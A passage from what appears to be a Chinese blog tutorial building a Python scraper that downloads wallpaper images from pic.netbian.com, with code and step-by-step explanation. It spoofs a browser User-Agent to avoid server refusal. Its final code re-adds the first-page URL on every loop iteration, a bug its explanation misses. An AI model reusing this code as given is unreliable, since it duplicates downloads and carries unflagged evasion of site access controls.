10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42&#x27;&#125;#UA伪装，防止服务器拒绝访问url = &quot;https://pic.netbian.com/4kdongman/index.html&quot;response = requests.get(url, headers=headers).text.encode(&#x27;iso-8859-1&#x27;)#获取网页内容，同时将网页内容编码为iso-8859-1，也就是解析为中文，要不然全是乱码，根本不是给人看到tree = etree.HTML(response)#解析网页内容,用这个来加载xpathpic_path = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/img/@src&#x27;)[0]#获取相对位置的图片urlprint(pic_path)#打印相对位置的图片url\n\n这里我们先看一下找到的是不是相对位置，下面图片是输出\n\n确实是我们想要的输出。\n对于xpath怎么获取图片的url，在浏览器我们可以直接右键获取xpath地址，如有需要还是建议大家去看看xpath的语法。\n以后我们再细讲一下，我们先来分析我们的代码\n\n\n\n两个中随便挑一个就行，我们这里用的是//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/img这样为了我们能够拿到html中的图片url，我们需要用到@src属性，这个属性可以帮助我们拿到图片的url，当然返回的是一个列表，我们再用[0]来获取第一个url，就可以拿到图片的url了。//*[@id=&quot;main&quot;]/div[3]/ul/li[1]/a/img/@src\n这样我们就拿到了第一个图片的位置，但是我们需要拿到所以的图片的url，那我们要怎么办呢？\n聪明的同志已经知道了，那就写个循环呗，把所有的url都拿到。\n\n但提醒一点的是，我们是进入到了&lt;li&gt;标签中拿到的图片的URL，我们再分析一下图片的位置，我们会发现，所有的图片都包裹在&lt;li&gt;中，所以我们只需要循环遍历所有的&lt;li&gt;标签，然后再用xpath来获取图片的url就行了。\n\n所以事不宜迟，我们改代码把所有图片的url都拿到。\ntree = etree.HTML(response)#解析网页内容,用这个来加载xpathpic_path = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;)#获取相对位置的图片urlfor pic in pic_path:    html_url = &quot;https://pic.netbian.com&quot; + pic.xpath(&#x27;a/img/@src&#x27;)[0]    print(html_url)\n\n\n\ntree = etree.HTML(response)#解析网页内容,用这个来加载xpath这个代码及以上都没有改动，只有他的下面进行了改动，以后我们也是这样提示我们所改动的地方!!!!!!。\n\n\n下面是输出,这样我们就拿到了所有图片的url了，当然只是这一页，下面的页数我们稍后再讲。\n\n我们再来获取他的名字，这个我们就不解释了，希望大家自己尝试一下，我们直接给出代码。\npic_path = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;)#获取相对位置的图片urlfor pic in pic_path:    html_url = &quot;https://pic.netbian.com&quot; + pic.xpath(&#x27;a/img/@src&#x27;)[0]    name_url = pic.xpath(&#x27;a/b/text()&#x27;)[0]    print(html_url)    print(name_url)\n下面是输出\n\n代码解析之三我们现在开始编写代码来下载图片\n既然名字和地址我们都拿到了，剩下的就是怎么把图片给下载下来了。\n\n这里有一点要注意，图片保存的时候名字有限制，比如我们下载的第一个图片的名字中有星号，这就不行，所以我们需要对名字进行处理，比如把空格替换成下划线，把*替换成其他字符等。\n\nfor pic in pic_path:    html_url = &quot;https://pic.netbian.com&quot; + pic.xpath(&#x27;a/img/@src&#x27;)[0]    name_url = pic.xpath(&#x27;a/b/text()&#x27;)[0]    print(html_url)    print(name_url)    name = str(name_url.replace(&quot; &quot;, &quot;_&quot;) + &quot;.jpg&quot;)    name = str(name.replace(&quot;*&quot;, &quot;&quot;))  # 处理文件名中含有*的情况，有些文件名中含有*会导致文件无法保存        pic_get = requests.get(html_url, headers=headers).content#获取图片内容            pic_save_path = &quot;./pic/&quot; + name # 图片保存路径    if not os.path.exists(&quot;./pic/&quot;):#判断图片保存路径是否存在，不存在则创建        os.makedirs(&quot;./pic/&quot;)    with open(pic_save_path, &#x27;wb&#x27;) as f:        f.write(pic_get)        print(name + &quot;下载完成！&quot;)                time.sleep(0.3) # 防止被服务器封IP\n下面是输出\n\n首先，我们获取的名字需要处理，我们需要把名字中的空格和星号都处理掉，这样才能保存为一个文件名，同时我们要加入.jpg后缀，才能保存图片，我们就用replace()函数来替换空格和星号，然后加上.jpg后缀，replace函数的第一个参数是被替换的字符，第二个参数是替换成什么字符。\n然后，我们获取图片的url，然后用requests库来获取图片的内容，requests.get(url, headers=headers).content,这里的content是持续化存储，我们要用这种方式存储图片。\n我们再用os库来判断图片保存路径是否存在，不存在则创建，然后用with open(pic_save_path, &#39;wb&#39;) as f:来写入图片内容，最后打印下载完成。\n\n对于with open(pic_save_path, &#39;wb&#39;) as f:这句代码，我们用wb模式打开文件，wb模式是写入二进制文件，with open(pic_save_path, &#39;wb&#39;) as f:的意思是打开一个文件，文件名为pic_save_path，以二进制写入模式打开，然后用f.write(pic_get)来写入图片内容，pic_get是获取到的图片内容。\n\n最后，我们用time.sleep(0.3)来防止被服务器封IP，毕竟我们只是练习，我们并不希望用这个爬虫给别人网站造成压力。\n代码解析之四我们再来下载其他页面的图片\n说实话到这里基本上已经完成一半多了，我们再坚持一下，就成功了。\n我们先来分析一下其他页面的图片的位置。\n第一页\n\n第二页\n\n第三页\n\n\n我们可以看到，第一页为index.html，第二页为index_2.html，第三页为index_3.html。\n\n大家可以自己分析一下第二，三页图片的位置，是和第一页一样的，我们不再赘述。\n这样我们就得开动一下脑筋，第一页和其他页的url有差别，但是第二三四及以后的页面的url是有规律的，我们可以用循环来实现，但是第一页呢？\n当然我们可以直接用笨办法，写两个循环，但感觉太臃肿了，不太好。\n代码解析之五实现思路及优化\n\n思路导图\n\n\nimport timefrom lxml import etreeimport requestsimport osheaders = &#123;    &#x27;User-Agent&#x27;: &#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.42&#x27;&#125;if not os.path.exists(&quot;./pic/&quot;):    os.makedirs(&quot;./pic/&quot;)url_list = []page = 0def pic_path():    global page,url_list    while True:        page = input(&quot;输入下载页数：&quot;)        try:            page = int(page)        except ValueError:            print(&quot;输入页数有误！&quot;)            continue        if page == 1:            url = &quot;https://pic.netbian.com/4kdongman/index.html&quot;            return url        elif page &gt; 1:            for i in range(2, page + 1):                url_list.append(&quot;https://pic.netbian.com/4kdongman/index.html&quot;)                url_list.append(&quot;https://pic.netbian.com/4kdongman/index_&#123;&#125;.html&quot;.format(i))            return None        else:            print(&quot;输入页数有误！&quot;)            continuedef download(url):    if url is not None:        response = requests.get(url, headers=headers).text.encode(&#x27;iso-8859-1&#x27;)        Batch_processing(response)    else:        for url in url_list:            response = requests.get(url, headers=headers).text.encode(&#x27;iso-8859-1&#x27;)            Batch_processing(response)def Batch_processing(response):    tree = etree.HTML(response)    pic_list = tree.xpath(&#x27;//*[@id=&quot;main&quot;]/div[3]/ul/li&#x27;)    for pic_list_item in pic_list:        html_url = &quot;https://pic.netbian.com&quot; + pic_list_item.xpath(&#x27;a/img/@src&#x27;)[0]        name_pat = pic_list_item.xpath(&#x27;a/b/text()&#x27;)[0]        print(html_url)        print(name_pat)        try:            name = str(name_pat.replace(&quot; &quot;, &quot;_&quot;) + &quot;.jpg&quot;)            name = str(name.replace(&quot;*&quot;, &quot;&quot;))  # 处理文件名中含有*的情况，有些文件名中含有*会导致文件无法保存            pic_get = requests.get(html_url, headers=headers).content            pic_save_path = &quot;./pic/&quot; + name            with open(pic_save_path, &#x27;wb&#x27;) as f:                f.write(pic_get)                print(name + &quot;下载完成！&quot;)        except :            print(name + &quot;下载失败！&quot;)        time.sleep(0.2)if __name__ == &#x27;__main__&#x27;:    url = pic_path()    download(url)\n\n我的思路是首先把一些无用的资源放到外面，减少资源的浪费，比如说headers、url_list、page，比较headers用的话只用他的常量，放到循环里面，不断的加载他却不用，就是资源的浪费。\n\n\n毕竟第一页和其他页并没有什么规律，我就打算把其他页的url都放到url_list里面。\n\n\n对于page在外面就是随便设置的一个量，你设置1000000000000000也没有问题，我们主要是用page判断你要下载的页面数量，肯定是要立马获取的，一进入程序就会把page的值进行修改，所以我觉得还是放到外面比较好。\n\n首先，我们定义了一个函数pic_path(),在这个函数里面，我们先把page和url_list都放到全局变量里面,因为我们要在函数中改变page的值，所以用全局变量，让其他的函数可以访问到。\n之后，我们用input获取我们要下载的页数，然后用try except来判断输入的是否为数字，如果不是数字，就提示输入有误，如果是数字，就判断是否大于1，如果大于1，就把url_list里面添加url(毕竟第一页和其他页没有联系，所以我们就直接把直接把第一页的url放到url_list里面)，如果等于1，就返回url。\n所以当我们要下载的页数超过两页的时候，我们就让函数遍历url_list，获取url。\n然后，我们定义了一个函数download(url),这个函数就是用来下载图片的，我们先判断url是否为None，如果不是None，就说明是第一页，我们就直接调用Batch_processing(response)函数，如果是None，就说明不是第一页，我们就遍历url_list，调用Batch_processing(response)函数。\n然后，我们定义了一个函数Batch_processing(response),这个函数就是用来处理图片的，我们先用etree来解析网页内容，然后用xpath来获取图片的url和名字，然后用requests来获取图片的内容，然后用os来判断图片保存路径是否存在，不存在则创建，然后用with open(pic_save_path, &#39;wb&#39;) as f:来写入图片内容，最后打印下载完成。\n最后，我们用if __name__ == &#39;__main__&#39;:来判断是否是主函数，如果是，就调用pic_path()函数，获取url，然后调用download(url)函数，开始下载图片。\n这样，我们就实现了下载所有页面的图片。\n\n如果你感觉这篇文章不错，而且财力充足的话，希望可以用爱发电支持一下作者，感谢支持！\n爱发电地址:https://afdian.net/a/AuroraBreeze\n\n","categories":["python"],"tags":["爬虫"]}]